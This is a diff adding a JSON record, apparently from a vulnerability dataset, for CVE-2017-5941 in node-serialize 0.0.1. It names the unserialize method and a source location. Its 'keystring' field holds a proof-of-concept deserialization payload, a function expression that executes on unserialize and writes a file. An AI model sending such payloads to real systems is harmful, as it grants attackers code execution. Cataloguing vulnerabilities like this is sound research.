@@ -1,0 +1,8 @@
+{
+  "id": "CVE-2017-5941",
+  "upstream": "node-serialize@0.0.1",
+  "keymethod": "unserialize",
+  "keystring": "{\"rce\":\"_$$ND_FUNC$$_function (){require(`fs`).writeFileSync(`node-serialize`,``);}()\"}",
+  "location": "lib/serialize.js:75:22",
+  "downstreams": []
+}
